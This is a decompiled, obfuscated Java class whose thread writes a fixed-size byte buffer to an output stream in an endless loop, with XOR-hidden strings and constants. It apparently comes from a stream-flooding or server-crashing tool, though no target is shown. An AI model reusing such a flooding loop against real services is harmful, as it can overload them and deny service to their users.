import java.io.IOException;
import java.io.OutputStream;

class J2 extends Thread {
   final yF_3 e;
   private final OutputStream c;
   private static final String a;
   private static final long b;

   J2(yF_3 var1, OutputStream var2) {
      this.e = var1;
      this.c = var2;
   }

   @Override
   public void run() {
      byte[] var1 = new byte[(int)b];
      int var2 = 0;

      while (true) {
         var2++;

         try {
            this.c.write(var1);
            System.out.println(a + var2);
         } catch (IOException var4) {
            var4.printStackTrace();
            return;
         }
      }
   }

   // $VF: Irreducible bytecode was duplicated to produce valid code
   static {
      char[] var10003 = "冄兙寞扃\u007f".toCharArray();
      int var10004 = var10003.length;
      int var2 = 0;
      byte var13 = 62;
      char[] var10002 = var10003;
      int var4 = var10004;
      char[] var17;
      byte var21;
      int var10005;
      char var10006;
      byte var10007;
      if (var10004 <= 1) {
         var17 = var10003;
         var10005 = var2;
         char var10008 = var10003[var2];
         var10007 = 62;
         var10006 = var10008;
         switch (var2 % 7) {
            case 0:
               var21 = 35;
               break;
            case 1:
               var21 = 2;
               break;
            case 2:
               var21 = 108;
               break;
            case 3:
               var21 = 109;
               break;
            case 4:
               var21 = 97;
               break;
            case 5:
               var21 = 5;
               break;
            default:
               var21 = 38;
         }
      } else {
         var13 = 62;
         var4 = var10004;
         if (var10004 <= var2) {
            String var16 = new String(var10003).intern();
            byte var8 = -1;
            a = var16;
            long var3 = 3504185238073316157L;
            long var12 = 6669798666070857613L ^ var3;
            var8 = -1;
            b = var12;
            return;
         }

         var17 = var10003;
         var10005 = var2;
         char var22 = var10003[var2];
         var10007 = 62;
         var10006 = var22;
         switch (var2 % 7) {
            case 0:
               var21 = 35;
               break;
            case 1:
               var21 = 2;
               break;
            case 2:
               var21 = 108;
               break;
            case 3:
               var21 = 109;
               break;
            case 4:
               var21 = 97;
               break;
            case 5:
               var21 = 5;
               break;
            default:
               var21 = 38;
         }
      }

      while (true) {
         var17[var10005] = (char)(var10006 ^ var10007 ^ var21);
         var2++;
         if (var13 == 0) {
            var17 = var10002;
            var10005 = var13;
            char var24 = var10002[var13];
            var10007 = var13;
            var10006 = var24;
            switch (var2 % 7) {
               case 0:
                  var21 = 35;
                  break;
               case 1:
                  var21 = 2;
                  break;
               case 2:
                  var21 = 108;
                  break;
               case 3:
                  var21 = 109;
                  break;
               case 4:
                  var21 = 97;
                  break;
               case 5:
                  var21 = 5;
                  break;
               default:
                  var21 = 38;
            }
         } else {
            if (var4 <= var2) {
               String var15 = new String(var10002).intern();
               byte var6 = -1;
               a = var15;
               long var0 = 3504185238073316157L;
               long var11 = 6669798666070857613L ^ var0;
               var6 = -1;
               b = var11;
               return;
            }

            var17 = var10002;
            var10005 = var2;
            char var23 = var10002[var2];
            var10007 = var13;
            var10006 = var23;
            switch (var2 % 7) {
               case 0:
                  var21 = 35;
                  break;
               case 1:
                  var21 = 2;
                  break;
               case 2:
                  var21 = 108;
                  break;
               case 3:
                  var21 = 109;
                  break;
               case 4:
                  var21 = 97;
                  break;
               case 5:
                  var21 = 5;
                  break;
               default:
                  var21 = 38;
            }
         }
      }
   }
}





